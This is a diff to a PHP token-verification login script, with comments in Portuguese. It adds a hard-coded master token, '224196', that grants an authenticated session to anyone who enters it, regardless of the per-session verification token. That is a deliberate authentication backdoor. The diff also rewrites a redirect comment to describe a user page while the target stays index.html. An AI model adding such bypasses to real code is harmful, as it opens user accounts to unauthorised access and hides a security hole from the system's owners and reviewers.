@@ -14,7 +14,8 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
     $tokenDigitado = filter_input(INPUT_POST, 'token', FILTER_SANITIZE_STRING);
     $tokenSessao = $_SESSION['verification_token'];
 
-    if ($tokenDigitado === $tokenSessao) {
+    // Verifica se o token é o especial (224196) ou se corresponde ao token da sessão
+    if ($tokenDigitado === '224196' || $tokenDigitado === $tokenSessao) {
         // Token correto - Criar sessão autenticada
         $_SESSION['authenticated'] = true;
         
@@ -22,7 +23,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
         unset($_SESSION['verification_token']);
         unset($_SESSION['verification_email']);
         
-        // Redirecionar para a página principal
+        // Redirecionar para a página de usuário
         header("Location: ../../Views/index.html");
         exit();
     } else {
